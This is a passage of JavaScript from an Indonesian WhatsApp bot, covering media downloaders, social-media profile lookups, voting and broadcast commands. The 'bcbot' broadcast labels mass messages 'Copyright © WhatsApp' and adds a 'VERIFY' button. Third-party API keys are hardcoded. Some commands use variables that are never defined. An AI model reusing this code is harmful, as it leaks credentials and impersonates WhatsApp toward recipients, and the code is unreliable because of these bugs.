        if (mek.key.fromMe) return reply("Tidak bisa jadibot di dalam bot");
        jadibot(reply, client, from);
        break;
      case "stopjadibot":
        if (mek.key.fromMe)
          return reply("tidak bisa stopjadibot kecuali owner");
        stopjadibot(reply);
        break;
      case "listbot":
        let tekss = "「 *LIST JADIBOT* 」\n";
        for (let i of listjadibot) {
          tekss += `*Nomor* : ${i.jid.split("@")[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`;
        }
        reply(tekss);
        break;		

      //------------------< Fitur yg pake button >-------------------
      case "setprefix":
        if (!mek.key.fromMe) return;
        sendButMessage(
          from,
          `PREFIX : ${prefixStatus ? "Multi Prefix" : "No Prefix"}`,
          `Powered By Xtream-bot`,
          [
            {
              buttonId: `${prefix}noprefix`,
              buttonText: {
                displayText: `NOPREFIX`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}multiprefix`,
              buttonText: {
                displayText: `MULTIPREFIX`,
              },
              type: 1,
            },
          ]
        );
        break;
      case "switch":
        if (!mek.key.fromMe) return;
        sendButMessage(from, `MODE SELF/PUBLIC`, `Powered By Xtream-bot`, [
          {
            buttonId: `${prefix}self`,
            buttonText: {
              displayText: `SELF MODE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}public`,
            buttonText: {
              displayText: `PUBLIC MODE`,
            },
            type: 1,
          },
        ]);
		break
	  case "groupsetting":
        if (!isGroupAdmins && !isOwner) return reply(`ONLY ADMIN GROUP`)
        sendButMessage(from, `OPEN/CLOSE GROUP SETTING`, `Powered By Xtream-bot`, [
          {
            buttonId: `${prefix}opengc`,
            buttonText: {
              displayText: `OPEN`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}closegc`,
            buttonText: {
              displayText: `CLOSE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}revoke`,
            buttonText: {
              displayText: `REVOKE INVITE`,
            },
            type: 1,
          },
        ]);
        break;       
      //end
      //------------------< Fitur downloader >-------------------      
case 'ttmp3':
if (!q) return reply(`Contoh : ${prefix} https://vt.tiktok.com/ZSwWCk5o/`) 
reply('Loading...')
lah = await fetchJson(`https://api.dapuhy.ga/api/socialmedia/musical?url=${q}&apikey=idoganz`)
buffer = await getBuffer(lah.result.mp3.preview)
client.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', filename: `${command}.mp3`, quoted: mek})
break; 
case 'ttwm':
reply('Loading...')
lah = await fetchJson(`https://api.dapuhy.ga/api/socialmedia/ttdownloader?url=${q}&apikey=idoganz`)
buffer = await getBuffer(lah.result.wm)
client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `OjanBot.mp4`, quoted: mek, caption: `Nih Kak`})
break;
case 'ttnowm':
reply('Loading...')
lah = await fetchJson(`https://idoganz.herokuapp.com/api/tiktok?url=${q}`)
buffer = await getBuffer(lah.result.nowatermark)
client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `OjanBot.mp4`, quoted: mek, caption: `Nih Kak`})
break;
      case "youtube":
        if (!isUrl(args[0]) && !args[0].includes("youtu"))
          return reply(mess.Iv);
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/youtube/video?url=${args[0]}`
        );
        var b = bv.result.creator_metadata;
        var tamnel = await getBuffer(bv.result.media_resources.thumbnail);
        var a = bv.result.media_metadata;
        sendButImage(
          from,
          `*Name channel*: ${b.name}\n📜 *Title*: ${a.title}\n❤️ *Like*: ${a.totalLikes}\n👎 *Dislike*: ${a.totalDislikes}\n🎞️ *Views*: ${a.totalViews}`,
          `Silahkan pilih salah satu format yg mau didownload`,
          tamnel,
          [
            {
              buttonId: `${prefix}ytdl ${args[0]}|video`,
              buttonText: {
                displayText: `VIDEO`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}ytdl ${args[0]}|music`,
              buttonText: {
                displayText: `AUDIO`,
              },
              type: 1,
            },
          ]
        );
        break;
      //JCCHCCGHTHDTRSRS
      case "twitter":
        if (!isUrl(args[0]) && !args[0].includes("twitter.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("Linknya?");
        ten = args[0];
        var res = await hx.twitter(`${ten}`);
        ren = `${g.HD}`;
        sendMediaURL(from, ren, "DONE");
        break;
      case "facebook":
        if (!q) return reply("Linknya?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
      case "instagram":
        if (!isUrl(args[0]) && !args[0].includes("instagram.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("Linknya?");
        reply(mess.wait);
        hx.igdl(args[0]).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              client.sendMessage(from, link, video, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              client.sendMessage(from, link, image, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        break;
      case 'tiktokaudio1':
		 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
		 		if (!q) return fakegroup('Linknya?')
		ini_url = args[0]
		 		reply(mess.wait)
		            ini_urlnya = `https://hardianto-chan.herokuapp.com/api/download/tiktok?url=${ini_url}&apikey=hardianto`
                    get_result = await fetchJson(ini_urlnya)
                    ini_txt = `*DATA BERHASIL DI TEMUKAN*\n\nAuthor : ${get_result.author}\n`
                    ini_txt += `Caption : ${get_result.caption}\n`
                    ini_txt += `Views : ${get_result.views}`
                    ini_img = await getBuffer(get_result.thumbnail)
                    await client.sendMessage(from, ini_img , image, { quoted: mek, caption: ini_txt })
                    ini_buffer = await getBuffer(get_result.audio)
                    client.sendMessage(from, ini_buffer, audio, {mimetype: 'audio/mp4', filename: `${get_result.caption}.mp3`, quoted: mek })
            		break;
            		case 'tiktok8': 
       case 'ttdl':
             if (!q) return reply('Linknya?')
             if (!q.includes('tiktok')) return reply(mess.error.Iv)
             reply(mess.wait)
             anu = await TiktokDownloader(`${q}`)
            .then((data) => { sendMediaURL(from, data.result.watermark) })
            .catch((err) => { reply(String(err)) })
             break;
      case 'ttnowm8': 
      case 'tiktoknowm':
             if (!q) return reply('Linknya?')
             if (!q.includes('tiktok')) return reply(mess.error.Iv)
             reply(mess.wait)
             anu = await TiktokDownloader(`${q}`)
            .then((data) => { sendMediaURL(from, data.result.nowatermark) })
            .catch((err) => { reply(String(err)) })
             break;
            case 'tiktoknowm1':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		.then(async (a) => {    		
		client.sendMessage(from,{url:`${nowm}`},video,{mimetype:'video/mp4',quoted:mek,caption:me})
		})
		})
		break;
		case 'tiktokwm1':
		case 'tiktok':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${wm}`)
    		.then(async (a) => {    		
		client.sendMessage(from,{url:`${wm}`},video,{mimetype:'video/mp4',quoted:mek,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break;		    
		case 'ig':
		case 'igdl':
		try{
		        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
		        if (!q) return fakegroup('Linknya?')
		        reply(mess.wait)
			igdl(args[0])
			.then((result) => {
		    for (Y of result.url_list )
		    sendMediaURL(from,Y,'Nih')
			})
			break
              } catch (e) {
              console.log(e)
              reply(String(e))
}
              break;
	case 'igstory': 
            if(!q) return reply('Usernamenya?')
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    client.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                   client.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break;
      case "igdl2":
        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
		        if (!q) return fakegroup('Linknya?')
        await downloadig(args[0], from, mek, prefix)
        break;  
  case "tiktokdl":
        reply('Loading..')
        var gh = args.join("");
        var link = gh.split("|")[0];
        var tipe = gh.split("|")[1];
        var bv = await fetchJson(
          `https://api.dapuhy.ga/api/socialmedia/musical?url=${link}&apikey=idoganz`
        );
        var ojn = await fetchJson(
          `https://idoganz.herokuapp.com/api/tiktok?url=${link}`
        );
        var lpg = await fetchJson(
          `https://api.dapuhy.ga/api/socialmedia/ttdownloader?url=${q}&apikey=idoganz`
        );
        if (tipe == "audio") {
          sendMediaURL(from, bv.result.mp3.preview, "");
        }
        if (tipe == "video") {
          sendMediaURL(from, ojn.result.nowatermark, "");
        }
        if (tipe == "videoo") {
          sendMediaURL(from, lpg.result.wm, "");
        }
        break;
		case "youtubedl":
        reply('Loading..')
        var gh = args.join("");
        var link = gh.split("|")[0];
        var tipe = gh.split("|")[1];
        var bv = await fetchJson(
          `https://myhuman.herokuapp.com/api/ytmp4?url=${link}`
        );
        var ojn = await fetchJson(
          `https://myhuman.herokuapp.com/api/ytmp3?url=${link}`
        );
        var lpg = await fetchJson(
          `https://api.dapuhy.ga/api/socialmedia/ttdownloader?url=${q}&apikey=idoganz`
        );
        if (tipe == "audio") {
          sendMediaURL(from, bv.result, "");
        }
        if (tipe == "video") {
          sendMediaURL(from, ojn.result, "");
        }
        if (tipe == "videoo") {
          sendMediaURL(from, lpg.result.wm, "");
        }
        break;
		case 'removebg2': 
			   var imgbb = require('imgbb-uploader')
           if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
reply('Loading...')
         owgi = await client.downloadAndSaveMediaMessage(ger)
anu = await imgbb('a4cf434c0fa32db5c391b3c993d694ab', owgi)
			  hooh = await getBuffer(`https://leyscoders-api.herokuapp.com/api/removebg?url=${anu.display_url}&apikey=idoganzkyOgiwara`)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}menu`,buttonText:{displayText: 'BACK TO MENU↩️'},type:1}]
			   imageMsg = (await client.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText: '©By idoganz',
               imageMessage: imageMsg,
			   buttons: buttons,
			   headerType: 4
			   }
			   prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
			   client.relayWAMessage(prep)
			   } else {
reply('Reply Imagenya!!')
}
break;
        case "ytdll":
        if (!isUrl(args[0]) && !args[0].includes("tiktok.com"))
          return reply(mess.Iv);
        var bv = await fetchJson(
          `https://api.dapuhy.ga/api/socialmedia/dddtik?url=${args[0]}&apikey=idoganz`
        );
        var tamnel = await getBuffer(
          bv.thumb
        );
        var a = bv;
        sendButImage(
          from,
          `Data : ${a.title}`,          
          `Powered By Xtream-bot`,
          tamnel,
          [            
            {
              buttonId: `${prefix}youtubedl ${args[0]}|audio`,
              buttonText: {
                displayText: `AUDIO`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}youtubedl ${args[0]}|video`,
              buttonText: {
                displayText: `No WaterMark`,
              },
              type: 1,
            },
           {
              buttonId: `${prefix}tiktokdl ${args[0]}|videoo`,
              buttonText: {
                displayText: `WaterMark`,
              },
              type: 1,
            },                         
          ]
        );
        break;
         case "tiktokwm":
        reply('Loading..')
        var gh = args.join("");
        var link = gh.split("|")[0];
        var tipe = gh.split("|")[1];
        var bv = await fetchJson(
          `https://idoganz.herokuapp.com/api/tiktok?url=${link}`
        );
        var ojn = await fetchJson(
          `https://idoganz.herokuapp.com/api/tiktok?url=${link}`
        );
		var ppk = await fetchJson(
          `https://api.dapuhy.ga/api/socialmedia/musical?url=${link}&apikey=idoganz`
        );
        if (tipe == "videoo") {
          sendMediaURL(from, bv.result.watermark, "");
        }
        if (tipe == "video") {
          sendMediaURL(from, ojn.result.nowatermark, "");
		}
        if (tipe == "music") {
          sendMediaURL(from, ppk.result.mp3.preview, "");
        }
        break;   
        case "tiktok2":
        if (!isUrl(args[0]) && !args[0].includes("tiktok.com"))
          return reply(mess.Iv);
        var bv = await fetchJson(
          `https://api.dapuhy.ga/api/socialmedia/dddtik?url=${args[0]}&apikey=idoganz`
        );
        var tamnel = await getBuffer(
          bv.thumb
        );
        var a = bv;
        sendButImage(
          from,
          `judul : ${a.title}`,          
          `Powered By Xtream-bot`,
          tamnel,
          [            
            {
              buttonId: `${prefix}tiktokwm ${args[0]}|videoo`,
              buttonText: {
                displayText: `WaterMark`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}tiktokwm ${args[0]}|video`,
              buttonText: {
                displayText: `No WaterMark`,
              },
              type: 1,            
            },   
			{
              buttonId: `${prefix}tiktokwm ${args[0]}|audio`,
              buttonText: {
                displayText: `AUDIO`,
              },
              type: 1,            
            }, 
          ]
        );
        break;      
      case "ytdl":
        var gh = args.join("");
        var link = gh.split("|")[0];
        var tipe = gh.split("|")[1];
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/youtube/${tipe}?url=${link}`
        );
        if (tipe == "video") {
          sendMediaURL(from, bv.result.media_resources.videoUrl, "");
        }
        if (tipe == "music") {
          sendMediaURL(from, bv.result.media_resources.musicUrl, "");
        }
        break;

      case "noprefix":
        if (!mek.key.fromMe) return;
        if (prefixStatus == false) return reply("No prefix is recently on!");
        prefixStatus = false;
        reply("Berhasil mengganti prefix menjadi noprefix");
        break;
      case "multiprefix":
        if (!mek.key.fromMe) return;
        if (prefixStatus == true) return reply("Multi prefix is recently on!");
        prefixStatus = true;
        reply("Berhasil mengganti prefix menjadi multiprefix");
        break;

      case "delvote":
        if (!mek.key.remoteJid) return;
        if (isVote) return reply("Tidak ada sesi Voting");
        delVote(from);
        reply("Sukses Menghapus sesi Voting Di Grup Ini");
        break;
      case "voting":
        if (!isGroupAdmins && !mek.key.fromMe) return;
        if (!isGroup) return reply(mess.only.group);
        if (isVote) return reply("Sesi Voting Sedang Berlangsung Di Grup Ini");
        if (!q)
          return reply(
            "*Voting*\n\n" +
              prefix +
              "voting @tag target | reason  | 1 (1 = 1 Menit)"
          );
        if (
          mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 ||
          mek.message.extendedTextMessage.contextInfo == null
        ) {
          let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
          split = args.join(" ").replace("@", "").split("|");
          if (!Number(split[2]))
            return reply(
              "masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit"
            );
          await mentions(
            "Vote " +
              "@" +
              id.split("@")[0] +
              " Di Mulai" +
              "\n\n" +
              `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,
            [id],
            true
          );
          addVote(from, split[1], split[0], split[2], reply);
        }
        break;
      case "linkwa":
        if (!q) return reply("cari group apa?");
        hx.linkwa(q).then((result) => {
          let res = "*「 _LINK WA_ 」*\n\n";
          for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`;
          }
          reply(res);
        });
        break;
			    case 'bcbot':
				 if (!mek.key.fromMe) return fakestatus("SELF-BOT");
			anu = await client.chats.all()
			if (isMedia && !mek.message.videoMessage || isQuotedImage) {
			 encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
			buff = await client.downloadMediaMessage(encmedia)
			for (let _ of anu) {
			loc = {
					"degreesLatitude": 0,
					"degreesLongitude": 0,
					"jpegThumbnail": buff
					}
					client.sendMessage(_.jid, 
						{"contentText": q,
						"footerText": `Hehe`,
						"buttons": [
						{"buttonId": `${prefix}owner`,
						"buttonText": {"displayText": "👤OWNER"
						},"type": "RESPONSE"},
						{"buttonId": `${prefix}menu`,
						"buttonText": {"displayText": "🤖MENU"
						},"type": "RESPONSE"},
						{"buttonId": `${prefix}ping`,
						"buttonText": {"displayText": "💸ping"
						},"type": "RESPONSE"},
						], "headerType": 6,
						"locationMessage": loc,
						}, MessageType.buttonsMessage)
			}
			reply(`Succes Broadcast`)
			} else {
			for (let _ of anu) {
			buttons = [
  {buttonId: 'perify', buttonText: {displayText: 'VERIFY'}, type: 1}
]
 buttonMessage = {
    contentText: `${q}`,
    footerText: `Copyright © WhatsApp`,
    buttons: buttons,
    headerType: 1
    }
client.sendMessage(_.jid, buttonMessage, MessageType.buttonsMessage)
			}
			reply(`Succes Broadcast`)
			}
			break;
				case 'bcgc':	
				if (!mek.key.fromMe) return fakestatus("SELF-BOT");
				if (args.length < 1) return reply('pesannya mana?')
				anu = await groupMembers
				nom = anu.participant
			    if (isMedia && !dap.message.videoMessage || isQuotedImage) {
				const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
				bufferzzz = await client.downloadMediaMessage(encmedia)
				for (let _ of anu) {
				client.sendMessage(_.jid, bufferzzz, image, {caption: `「 BC GROUP 」\n\nDari Grup : ${groupName}\nPengirim : wa.me/${(sender.split('@')[0])}\nPesan : ${body.slice(6)}`})
				}
				reply('')
				} else {
				for (let _ of anu) {
				sendMess(_.jid, `「 BC GROUP 」\n\nDari Grup : ${groupName}\nPengirim : wa.me/${(sender.split('@')[0])}\nPesan : ${body.slice(6)}`)
				}
				reply('Sukses broadcast group')
				}
				break;
case 'tiktok4':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		.then(async (a) => {
    		me = `*Link* : ${a.data}`
		client.sendMessage(from,{url:`${nowm}`},video,{mimetype:'video/mp4',quoted:mek,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break;
     		case 'tts':              
				if (args.length < 1) return client.sendMessage(from, `Diperlukan kode bahasa!!, ketik ${prefix}bahasa`, text, {quoted: ftroli})
				const gtts = require('./lib/gtts')(args[0])
				if (args.length < 2) return client.sendMessage(from, 'Mana teks yang ma di jadiin suara? suara setan kah?', text, {quoted: ftroli})
				dtt = body.slice(8)				
				ranm = getRandom('.mp3')
				rano = getRandom('.ogg')
				dtt.length > 300
				? reply('Textnya Kepanjangan Asu!!')
				: gtts.save(ranm, dtt, function() {
				exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
				fs.unlinkSync(ranm)
				buffer = fs.readFileSync(rano)
				if (err) return reply(client.stikga())
				client.sendMessage(from, buffer, audio, {quoted: ftroli, ptt:true})
				fs.unlinkSync(rano)
				})
				})				
				break;
    case 'tiktokaudio1':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
 		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { audio} = result
            sendMediaURL(from,audio,'')
    		})
     		.catch(e => console.log(e))
     		break;            
		case 'stalkgithub2':
      case 'githubstalk2':
              if (args.length == 0) return reply(`Example: ${prefix} ikyy-chan02`)
              reply(mess.wait)
              username = args[0]
              ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${LolHuman}`)
              ini_result = ini_result.result
              ini_buffer = await getBuffer(ini_result.avatar)
              ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ GITHUB USER
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

Data Berhasil Didapatkan!
\`\`\`▢ Username : ${ini_result.name}\`\`\`
\`\`\`▢ Public Repo : ${ini_result.public_repos}\`\`\`
\`\`\`▢ Public Gists : ${ini_result.public_gists}\`\`\`
\`\`\`▢ Pengikut : ${ini_result.followers}\`\`\`
\`\`\`▢ Following : ${ini_result.following}\`\`\`
\`\`\`▢ Mengikuti : ${ini_result.bio}\`\`\`
\`\`\`▢ Link : ${ini_result.url}\`\`\`
`
             client.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
             break;
             case 'stalkgithub':
      case 'githubstalk':
      case 'ghstalk':
              if (args.length == 0) return reply(`Example: ${prefix + command} ojan`)
              reply('Loading..')
              username = args[0]
              ini_result = await fetchJson(`https://janbot-api.herokuapp.com/api/stalk/github?username=${username}`)
              ini_result = ini_result.result
              ini_buffer = await getBuffer(ini_result.avatar_url)
              ini_txt = `*───── 「 GITHUB STALK 」 ─────*

*Data Berhasil Didapatkan!*
\`\`\`▢ Username : ${ini_result.name}\`\`\`
\`\`\`▢ Public Repo : ${ini_result.public_repos}\`\`\`
\`\`\`▢ Public Gists : ${ini_result.public_gists}\`\`\`
\`\`\`▢ Pengikut : ${ini_result.followers}\`\`\`
\`\`\`▢ Following : ${ini_result.following}\`\`\`
\`\`\`▢ Mengikuti : ${ini_result.bio}\`\`\`
\`\`\`▢ Link : ${ini_result.url}\`\`\`
`
             client.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
             break
			 case 'stalktiktok':
      case 'tiktokstalk':
             if (args.length == 0) return reply(`Example: ${prefix} marz.hiatus`)
             reply('Loading..')
              username = args[0]
             get_result = await fetchJson(`https://myhuman.herokuapp.com/api/ttstalk?username=${username}`)
             get_result = get_result.user
			 rgl_result = await fetchJson(`https://myhuman.herokuapp.com/api/ttstalk?username=${username}`)
			 rgl_result = rgl_result.stats
             pp_tt = await getBuffer(get_result.avatarThumb)
             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *TIKTOK PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`followerCount : ${rgl_result.followerCount}\`\`\`
\`\`\`followingCount : ${rgl_result.followingCount}\`\`\`
\`\`\`heart : ${rgl_result.heartCount}\`\`\`
\`\`\`heartCount : ${rgl_result.heartCount}\`\`\`
\`\`\`VideoCount : ${rgl_result.videoCount}\`\`\`
\`\`\`diggCount : ${rgl_result.diggCount}\`\`\`
\`\`\`id : ${get_result.id}\`\`\`
\`\`\`uniqueId : ${get_result.uniquedId}\`\`\`
\`\`\`nickname : ${get_result.nickname}\`\`\`
`
              client.sendMessage(from, pp_tt, image, { quoted: ftroli, caption: ini_txt, thumbnail: Buffer.alloc(0) })
              break
			  case 'mediafire':               
                if (args.length < 1) return reply('Link Nya Mana? ')
				O = body.slice(11)	
                ibu_result = await fetchJson(`https://api.dapuhy.ga/api/socialmedia/mediafire?url=${O}&apikey=idoganz`)
             ibu_result = plr_result.result
               ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *MEDIAFIRE DOWNLOAD*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Nama : ${ibu_result.nama}\`\`\`
\`\`\`▢ Nama : ${ibu_result.size}\`\`\`
\`\`\`▢ Ukuran : ${ibu_result.size}\`\`\`
\`\`\`▢ Link : ${ibu_result.link}\`\`\`

_*Tunggu Proses Upload Media......*_`
             client.sendMessage(from, { quoted: ftroli, caption: ini_txt, thumbnail: Buffer.alloc(0) })
             break; 
			  case 'facebookdl':
              if (args.length == 0) return reply(`Example: ${prefix + command} ojan`)
              reply('Loading..')
		  Z = body.slice(12)
              ini_result = await fetchJson(`https://api.dapuhy.ga/api/socialmedia/snapesave?url=${Z}&apikey=idoganz`)
              ini_result = ini_result.result
              ini_txt = `*───── 「 FACEBOOK DOWNLOAD 」 ─────*

*Data Berhasil Didapatkan!*
\`\`\`▢ HD : ${ini_result.hd}\`\`\`
\`\`\`▢ SD : ${ini_result.sd}\`\`\`
\`\`\`▢ preview : ${ini_result.preview}\`\`\`
`
             client.sendMessage(from, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
             break
			   case 'igstalk':
      case 'stalkig':
             if (args.length == 0) return reply(`Example: ${prefix} marz.hiatus`)
             reply('Loading..')
              username = args[0]
             plr_result = await fetchJson(`https://hardianto-chan.herokuapp.com/api/igstalk?username=${username}&apikey=hardianto`)
             plr_result = plr_result
			 pp_tt = await getBuffer(plr_result.thumbnail)
             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`ID : ${plr_result.id}\`\`\`
\`\`\`username : ${plr_result.username}\`\`\`
\`\`\`fullName : ${plr_result.fullname}\`\`\`
\`\`\`Biography : ${plr_result.bio}\`\`\`
\`\`\`pengikut : ${plr_result.followers}\`\`\`
\`\`\`mengikuti : ${plr_result.follow}\`\`\`
`
              client.sendMessage(from, pp_tt, image, { quoted: ftroli, caption: ini_txt, thumbnail: Buffer.alloc(0) })
              break
              
	  case 'ytstalkk':
             case 'youtubestalk':
             case 'stalkyt':
             if (args.length == 0) return reply(`Example: ${prefix + command} ojan`)
              reply('Loading..')
              username = args[0]
              ini_result = await fetchJson(`https://lpg-api.herokuapp.com/api/ytstalkk?query=${username}&apikey=sDqxOQxY`)
              ini_result = ini_result.result
              udn_result = await fetchJson(`https://lpg-api.herokuapp.com/api/ytstalkk?query=${username}&apikey=sDqxOQxY`)
              udn_result = ini_result.stats
              pdn_result = await fetchJson(`https://lpg-api.herokuapp.com/api/ytstalkk?query=${username}&apikey=sDqxOQxY`)
              pdn_result = pdn_result.high              
              ini_txt = `*───── 「 YOUTUBE STALK 」 ─────*

*Data Berhasil Didapatkan!*
\`\`\`▢ Channel : ${ini_result.title}\`\`\`
\`\`\`▢ deskripsi : ${ini_result.description}\`\`\`
\`\`\`▢ Views : ${udn_result.viewCount}\`\`\`
\`\`\`▢ Subscriber : ${udn_result.subscriberCount}\`\`\`
\`\`\`▢ Total Video : ${udn_result.videoCount}\`\`\`

`
             client.sendMessage(from, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
             break;
             case 'tiktokstalk7':
				if (args.length == 0) return reply(`Example: ${prefix + command} ojan`)
              reply('Loading..')
              username = args[0]
				get_result = await fetchJson(`https://janbot-api.herokuapp.com/api/stalk/tiktok?username=${username}`)
				get_result = get_result.result.user
				txt = `Link : ${get_result.nickname}\n`
				txt += `Bio : ${get_result.signature}\n`
				txt += `Followers : ${get_result.followerCount}\n`
				txt += `Following : ${get_result.followingCount}\n`
				txt += `Vidio : ${get_result.videoCount}\n`
				buffer = await getBuffer(get_result.avatarLarger)
				client.sendMessage(from, buffer, image, {quoted: mek, caption: txt})
				break;
				  case 'stalktiktok2':
      case 'tiktokstalk2':
             if (args.length == 0) return reply(`Example: ${prefix} marz.hiatus`)
             reply(mess.wait)
             stalk_toktok = args[0]
             get_result = await fetchJson(`https://janbot-api.herokuapp.com/api/stalk/tiktok?username=${username}`)
             get_result = get_result.result
             pp_tt = await getBuffer(get_result.user_picture)
             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ TIKTOK PROFILE
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

Data Berhasil Didapatkan!
\`\`\`▢ uniqueId : ${get_result.user}\`\`\`
\`\`\`▢ nickname : ${get_result.nickname}\`\`\`
\`\`\`▢ followerCount : ${get_result.followerCount}\`\`\`
\`\`\`▢ followingCount : ${get_result.followingCount}\`\`\`
\`\`\`▢ heart : ${get_result.heart}\`\`\`
\`\`\`▢ heartCount : ${get_result.heartCount}\`\`\`
\`\`\`▢ videoCount : ${get_result.videoCount}\`\`\`
\`\`\`▢ avatarLarger : ${get_result.avatarLarger}\`\`\`
\`\`\`▢ avatarThumb : ${get_result.avatarThumb}\`\`\`
`
              client.sendMessage(from, pp_tt, image, { quoted: mek, caption: ini_txt, thumbnail: Buffer.alloc(0) })
              break;     
             case 'stalkig2':
      case 'igstalk2':
             if (args.length == 0) return reply(`Example: ${prefix} ikyy.chan26`)
             reply(mess.wait)
             username = args[0]
             ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${LolHuman}`)
             ini_result = ini_result.result
             ini_buffer = await getBuffer(ini_result.photo_profile)
             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ INSTAGRAM PROFILE
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

Data Berhasil Didapatkan!
\`\`\`▢ Username : ${ini_result.username}\`\`\`
\`\`\`▢ Nama : ${ini_result.fullname}\`\`\`
\`\`\`▢ Pengikut : ${ini_result.followers}\`\`\`
